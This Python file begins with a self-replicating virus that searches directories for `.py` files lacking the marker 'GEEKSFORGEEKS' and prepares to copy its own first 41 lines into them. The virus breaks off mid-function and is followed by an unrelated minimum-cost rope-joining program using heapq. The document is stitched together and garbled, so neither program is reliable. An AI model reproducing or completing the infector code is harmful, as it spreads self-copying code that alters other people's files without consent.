#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
# Python3 program to connect n
# ropes with minimum cost
import heapq
 
 
def minCost(arr, n):
 
    # Create a priority queue out of the
    # given list
    heapq.heapify(arr)
 
    # Initialize result
    res = 0
 
    # While size of priority queue
    # is more than 1
    while(len(arr) > 1):
 
        # Extract shortest two ropes from arr
        first = heapq.heappop(arr)
        second = heapq.heappop(arr)
 
        # Connect the ropes: update result
        # and insert the new rope to arr
        res += first + second
        heapq.heappush(arr, first + second)
 
    return res
 
 
# Driver code
if __name__ == '__main__':
 
    lengths = [4, 3, 2, 6]
    size = len(lengths)
 
    print("Total cost for connecting ropes is " +
          str(minCost(lengths, size)))
 
# This code is contributed by shivampatel5
'''
Time Complexity: O(N*log(N))
Space Complexity: O(N)
'''